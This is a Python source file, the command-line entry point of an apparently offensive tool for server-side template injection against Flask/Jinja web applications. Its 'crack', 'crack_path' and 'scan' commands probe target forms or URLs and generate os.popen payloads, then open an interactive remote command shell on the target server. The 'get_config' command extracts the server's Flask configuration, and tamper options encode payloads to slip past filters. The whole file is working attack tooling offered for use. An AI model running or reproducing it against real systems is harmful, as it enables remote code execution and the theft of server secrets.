"""命令行界面的入口

"""

import logging
from urllib.parse import urlparse
from typing import Callable, List, Dict
from functools import partial

import click


from .form import get_form
from .cracker import Cracker
from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
from .full_payload_gen import FullPayloadGen
from .scan_url import yield_form
from .requester import Requester
from .const import (
    OS_POPEN_READ,
    DEFAULT_USER_AGENT,
    CONFIG,
    DETECT_MODE_ACCURATE,
)
from .colorize import colored
from .webui import main as webui_main

TITLE = colored(
    "yellow",
    r"""
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ /
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
              /___/        /____/

    ------Made with passion by Marven11
""".strip(
        "\n"
    ),
    bold=True,
)
LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"

logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
logger = logging.getLogger("cli")


def cmd_exec_submitter(
    cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
) -> str:
    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显

    Args:
        cmd (str): payload对应的命令
        submitter (Submitter): 实际发送请求的submitter
        full_payload_gen (FullPayloadGen): 生成payload的FullPayloadGen

    Returns:
        str: 回显
    """
    payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
    if payload is None:
        logger.warning("%s generating payload.", colored("red", "Failed"))
        return ""
    logger.info("Submit payload %s", colored("blue", payload))
    if not will_print:
        payload_wont_print = (
            "Payload generator says that this " + "payload %s command execution result."
        )
        logger.warning(payload_wont_print, colored("red", "won't print"))
    result = submitter.submit(payload)
    assert result is not None
    return result.text


def interact(cmd_exec_func: Callable):
    """根据提供的payload生成方法向用户提供一个交互终端

    Args:
        cmd_exec_func (Callable): 根据输入的shell命令生成对应的payload
    """
    logger.info("Use %s to exit.", colored("cran", "Ctrl+D", bold=True))
    while True:
        try:
            cmd = input("$>> ")
        except EOFError:
            break
        except KeyboardInterrupt:
            break
        result = cmd_exec_func(cmd)
        print(result)


def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
    headers = {}
    if headers_list:
        for header in headers_list:
            k, _, v = header.partition(": ")
            if not k or not v:
                logger.warning(f"Failed parsing {repr(header)}, ignored.")
                continue
            if k.capitalize() != k:
                logger.warning(f"Header {k} is not capitalized, fixed.")
                k = k.capitalize()
            headers[k] = v
    if cookies:
        headers["Cookie"] = cookies
    return headers


@click.group()
def main():
    """click的命令组"""


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def get_config(
    url: str,
    action: str,
    method: str,
    inputs: str,
    interval: float,
    detect_mode: str,
    user_agent: str,
    header: tuple,
    cookies: str,
    proxy: str,
    tamper_cmd: str,
):
    """
    攻击指定的表单，并获得目标服务器的flask config
    """
    print(TITLE)
    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        proxy=proxy,
    )
    tamperer = None
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
    found, submitter, full_payload_gen = False, None, None
    for input_field in form["inputs"]:
        submitter = FormSubmitter(url, form, input_field, requester)
        if tamperer:
            submitter.add_tamperer(tamperer)
        cracker = Cracker(submitter, detect_mode=detect_mode)
        if not cracker.has_respond():
            logger.info("Test input field %s failed, continue...", input_field)
            continue
        full_payload_gen = cracker.crack()
        if not full_payload_gen:
            logger.info("Test input field %s failed, continue...", input_field)
            continue
        found = True
    if not found:
        logger.warning("Test form failed...")
        return
    assert submitter is not None and full_payload_gen is not None

    payload, will_print = full_payload_gen.generate(CONFIG)
    if not payload:
        logger.error("The generator %s generating payload", colored("red", "failed"))
        return
    if not will_print:
        logger.error(
            "The generated payload %s respond config.",
            colored("red", "won't"),
        )
        return
    resp = submitter.submit(payload)

    print(resp.text if resp is not None else None)


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def crack(
    url: str,
    action: str,
    method: str,
    inputs: str,
    exec_cmd: str,
    interval: float,
    detect_mode: str,
    user_agent: str,
    header: tuple,
    cookies: str,
    proxy: str,
    tamper_cmd: str,
):
    """
    攻击指定的表单
    """
    print(TITLE)
    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        proxy=proxy,
    )
    tamperer = None
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
    found, submitter, full_payload_gen = False, None, None
    for input_field in form["inputs"]:
        submitter = FormSubmitter(url, form, input_field, requester)
        if tamperer:
            submitter.add_tamperer(tamperer)
        cracker = Cracker(submitter, detect_mode=detect_mode)
        if not cracker.has_respond():
            logger.info("Test input field %s failed, continue...", input_field)
            continue
        full_payload_gen = cracker.crack()
        if not full_payload_gen:
            logger.info("Test input field %s failed, continue...", input_field)
            continue
        found = True
    if not found:
        logger.warning("Test form failed...")
        return
    assert submitter is not None and full_payload_gen is not None
    cmd_exec_func = partial(
        cmd_exec_submitter,
        submitter=submitter,
        full_payload_gen=full_payload_gen,
    )
    if exec_cmd == "":
        interact(cmd_exec_func)
    else:
        print(cmd_exec_func(exec_cmd))
    logger.warning("Bye!")


@main.command()
@click.option("--url", "-u", help="需要攻击的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def crack_path(
    url: str,
    exec_cmd: str,
    interval: float,
    detect_mode: str,
    user_agent: str,
    header: tuple,
    cookies: str,
    proxy: str,
    tamper_cmd: str,
):
    """
    攻击指定的路径
    """
    assert url is not None, "Please provide URL!"
    print(TITLE)
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        proxy=proxy,
    )
    submitter = PathSubmitter(url=url, requester=requester)
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
        submitter.add_tamperer(tamperer)
    cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
    full_payload_gen = cracker.crack()
    if full_payload_gen is None:
        logger.warning("Test form failed...")
        return
    cmd_exec_func = partial(
        cmd_exec_submitter,
        submitter=submitter,
        full_payload_gen=full_payload_gen,
    )
    if exec_cmd == "":
        interact(cmd_exec_func)
    else:
        print(cmd_exec_func(exec_cmd))
    logger.warning("Bye!")


@main.command()
@click.option("--url", "-u", help="需要扫描的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="检测模式，可为accurate或fast"
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def scan(
    url,
    exec_cmd,
    interval,
    detect_mode,
    user_agent,
    header,
    cookies,
    proxy,
    tamper_cmd: str,
):
    """
    扫描指定的网站
    """
    print(TITLE)
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        proxy=proxy,
    )
    url_forms = (
        (page_url, form)
        for (page_url, forms) in yield_form(requester, url)
        for form in forms
    )
    tamperer = None
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
    for page_url, form in url_forms:
        for input_field in form["inputs"]:
            submitter = FormSubmitter(page_url, form, input_field, requester)
            if tamperer:
                submitter.add_tamperer(tamperer)
            cracker = Cracker(submitter, detect_mode=detect_mode)
            if not cracker.has_respond():
                continue
            full_payload_gen = cracker.crack()
            if full_payload_gen is None:
                continue
            cmd_exec_func = partial(
                cmd_exec_submitter,
                submitter=submitter,
                full_payload_gen=full_payload_gen,
            )
            if exec_cmd == "":
                interact(cmd_exec_func)
            else:
                print(cmd_exec_func(exec_cmd))
            return
    logger.warning("Scan failed...")


@main.command()
@click.option("--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1")
@click.option("--port", "-p", default=11451, help="需要监听的端口, 默认为11451")
def webui(host, port):
    """
    启动webui
    """
    webui_main(host, port)


if __name__ == "__main__":
    main()
